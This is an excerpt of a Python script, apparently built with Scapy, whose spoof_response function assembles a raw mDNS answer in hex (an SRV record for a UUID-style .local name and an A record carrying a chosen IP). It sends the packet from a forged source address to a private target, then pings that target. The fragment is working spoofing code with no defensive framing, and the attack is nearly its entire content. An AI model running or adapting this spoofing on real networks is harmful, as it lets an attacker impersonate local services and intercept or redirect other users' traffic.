...
def spoof_response():
    ...
    #ansextratxt += '1a' #length of the next txt section (FN)
    ...
    ansextrasrv += '24 62 33 66 64 66 31 61 66 2d 34 35 63 62 2d 31 64 32 30 2d 63 39 37 35 2d 31 33 34 32 30 37 37 36 36 31 65 38 c0 1d' #the last domain

    #A record
    ansextraa   =  dom_loc #offset of the last domain (<uid with dashes>.local)
    ansextraa   += '00 01 80 01 00 00 00 78 00 04 ' + hex_ip

    ansextra = ansextratxt + ansextrasrv + ansextraa
    #ansextra = ansextrasrv + ansextraa
    ans += ansextra
    ...
    spoofed_pkt = IP(src='192.168.1.104', dst='192.168.100.145')/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)

    send(spoofed_pkt)

    ping = IP(dst="192.168.100.145",  ttl=20)/ICMP()
    send(ping)
